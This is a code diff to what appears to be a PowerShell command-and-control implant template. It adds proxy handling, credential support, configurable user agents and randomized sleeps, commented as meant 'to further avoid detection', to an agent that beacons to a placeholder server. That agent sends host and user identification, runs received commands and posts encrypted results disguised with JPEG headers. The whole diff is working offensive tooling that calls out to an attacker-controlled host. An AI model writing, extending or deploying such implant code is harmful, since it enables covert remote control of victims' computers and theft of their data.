@@ -10,6 +10,25 @@ $serverAddress = '{{SERVER_ADDRESS}}'
 $beaconPath = '{{BEACON_PATH}}'
 $commandResultPath = '{{CMD_RESULT_PATH}}'
 
+# Agent configuration
+$beaconInterval = {{BEACON_INTERVAL}}  # Seconds
+$jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage
+$maxFailuresBeforeFallback = {{MAX_FAILURES}}
+$maxBackoffTime = {{MAX_BACKOFF}}
+$maxSleepTime = {{MAX_SLEEP_TIME}}
+$userAgent = "{{USER_AGENT}}"
+
+# Authentication credentials (if configured)
+$username = "{{USERNAME}}"
+$password = "{{PASSWORD}}"
+$useCredentials = ($username -ne "") -and ($password -ne "")
+
+# Proxy configuration
+$proxyEnabled = {{PROXY_ENABLED}}
+$proxyType = "{{PROXY_TYPE}}"
+$proxyServer = "{{PROXY_SERVER}}"
+$proxyPort = "{{PROXY_PORT}}"
+
 # Initialize encryption key as null - will be obtained from server
 $global:encryptionKey = $null
 $global:firstContact = $true  # Flag to track if this is the first contact
@@ -17,6 +36,88 @@ $global:systemInfoSent = $false  # Flag to track if system info has been sent
 $global:clientID = $null  # Store client ID received from server (only used for first contact)
 
 {{PATH_ROTATION_CODE}}
+
+# Function to set up proxy configuration
+function Initialize-ProxySettings {
+    if (-not $proxyEnabled) {
+        return $null
+    }
+    
+    $proxy = $null
+    
+    try {
+        # Use system proxy settings
+        if ($proxyType -eq "system") {
+            # Get default system proxy
+            $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+            
+            # Check if we have a system proxy configured
+            if ($proxy) {
+                Write-Host "Using system proxy configuration"
+                return $proxy
+            } else {
+                Write-Host "No system proxy configured, continuing without proxy"
+                return $null
+            }
+        }
+        
+        # Use manual proxy settings
+        if ($proxyServer -and $proxyPort) {
+            $proxyUri = "http://$proxyServer`:$proxyPort"
+            
+            if ($proxyType -eq "http") {
+                $proxy = New-Object System.Net.WebProxy($proxyUri, $true)
+                Write-Host "Using HTTP proxy: $proxyUri"
+            }
+            elseif ($proxyType -eq "socks4" -or $proxyType -eq "socks5") {
+                # Direct SOCKS support is limited in .NET
+                # This sets the proxy as HTTP, but with SOCKS endpoint
+                # A more complete implementation would use a SOCKS library
+                $proxy = New-Object System.Net.WebProxy($proxyUri, $true)
+                Write-Host "Using $proxyType proxy: $proxyUri (via HTTP proxy)"
+            }
+            
+            # Add proxy credentials if configured
+            if ($useCredentials) {
+                $credentials = New-Object System.Net.NetworkCredential($username, $password)
+                $proxy.Credentials = $credentials
+                Write-Host "Proxy credentials configured"
+            }
+            
+            return $proxy
+        }
+    }
+    catch {
+        Write-Host "Error configuring proxy: $_"
+    }
+    
+    # Default return if no proxy configured
+    return $null
+}
+
+# Initialize proxy settings
+$global:proxyInstance = Initialize-ProxySettings
+
+# Function to create a WebClient with proper settings
+function New-ConfiguredWebClient {
+    $webClient = New-Object System.Net.WebClient
+    
+    # Set User-Agent
+    $webClient.Headers.Add("User-Agent", $userAgent)
+    
+    # Set proxy if enabled
+    if ($proxyEnabled -and $global:proxyInstance) {
+        $webClient.Proxy = $global:proxyInstance
+    }
+    
+    # Add authentication credentials if configured
+    if ($useCredentials) {
+        $credentials = New-Object System.Net.NetworkCredential($username, $password)
+        $webClient.Credentials = $credentials
+    }
+    
+    return $webClient
+}
 
 # Function to encrypt data for C2 communication with binary JPEG header
 function Encrypt-Data {
@@ -161,6 +262,10 @@ function Get-SystemIdentification {
         "Unknown"
     }
     
+    # Add proxy information for diagnostics
+    $systemInfo.ProxyEnabled = $proxyEnabled
+    $systemInfo.ProxyType = $proxyType
+    
     # Add OS info for better identification
     $systemInfo.OsVersion = [System.Environment]::OSVersion.VersionString
     $systemInfo.Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
@@ -254,11 +359,7 @@ function Process-Commands {
                 $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
                 
                 # Create a web client for result submission
-                $resultClient = New-Object System.Net.WebClient
-                
-                # Add only standard headers for web browsing (no custom headers)
-                $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-                $resultClient.Headers.Add("Content-Type", "application/json")
+                $resultClient = New-ConfiguredWebClient
     
                 # Try to send the result - with retry mechanism
                 $maxRetries = 3
@@ -357,11 +458,7 @@ function Process-Commands {
             $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
             $resultUrl = "http://$serverAddress$cmdResultPath"
             
-            $resultClient = New-Object System.Net.WebClient
-            
-            # Add only standard headers, no custom headers
-            $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-            $resultClient.Headers.Add("Content-Type", "application/json")
+            $resultClient = New-ConfiguredWebClient
             
             # Create payload with encrypted data (JPEG header is now added inside Encrypt-Data)
             # Include random token field in the response
@@ -400,11 +497,7 @@ function Process-Commands {
             $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
             $resultUrl = "http://$serverAddress$cmdResultPath"
             
-            $resultClient = New-Object System.Net.WebClient
-            
-            # Add only standard headers, no custom headers
-            $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-            $resultClient.Headers.Add("Content-Type", "application/json")
+            $resultClient = New-ConfiguredWebClient
             
             # Create payload with encrypted data and random token
             $payload = @{
@@ -457,10 +550,7 @@ function Send-GetBeacon {
         $fullUrl = "$Url$queryString"
         
         # Create web client and set headers
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-        $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
-        $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
+        $webClient = New-ConfiguredWebClient
         
         # Download the response as a string
         Write-Host "Sending GET beacon to $fullUrl"
@@ -482,11 +572,10 @@ function Send-PostBeacon {
     )
     
     try {
-        # Create web client and set headers
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-        $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
-        $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
+        # Create web client with proper configuration
+        $webClient = New-ConfiguredWebClient
+        
+        # Add content type for JSON
         $webClient.Headers.Add("Content-Type", "application/json")
         
         # Send the POST request
@@ -556,20 +645,32 @@ function Process-ServerResponse {
     }
 }
 
+# Function to perform a random sleep within configured limits
+function Start-RandomSleep {
+    # Generate a random sleep time between 1 and maxSleepTime seconds
+    if ($maxSleepTime -gt 1) {
+        $sleepDuration = Get-Random -Minimum 1 -Maximum $maxSleepTime
+        Write-Host "Performing random sleep for $sleepDuration seconds"
+        Start-Sleep -Seconds $sleepDuration
+        return $true
+    }
+    return $false
+}
+
 # Main agent loop
 function Start-AgentLoop {
-    $beaconInterval = {{BEACON_INTERVAL}}  # Seconds
-    $jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage to randomize beacon timing
-    
     # Track failed connection attempts for fallback
     $consecutiveFailures = 0
-    $maxFailuresBeforeFallback = {{MAX_FAILURES}}
     
     # Boolean to track if we're using fallback paths
     $usingFallbackPaths = $false
     
     while ($true) {
         try {
+            # Randomly sleep before operations to further avoid detection
+            # This creates more unpredictable timing patterns
+            Start-RandomSleep | Out-Null
+            
             # Check if rotation time has passed but we haven't got new paths yet
             Check-PathRotation
             
@@ -691,8 +792,8 @@ function Start-AgentLoop {
             
             # If still failing with fallback paths, increase the beacon interval temporarily
             if ($consecutiveFailures -gt ($maxFailuresBeforeFallback * 2)) {
-                # Exponential backoff with max of 5 minutes
-                $backoffSeconds = [Math]::Min({{MAX_BACKOFF}}, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
+                # Exponential backoff with max of the configured max backoff time
+                $backoffSeconds = [Math]::Min($maxBackoffTime, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
                 Write-Host "Connection issues persist, waiting $backoffSeconds seconds before retry"
                 Start-Sleep -Seconds $backoffSeconds
                 continue
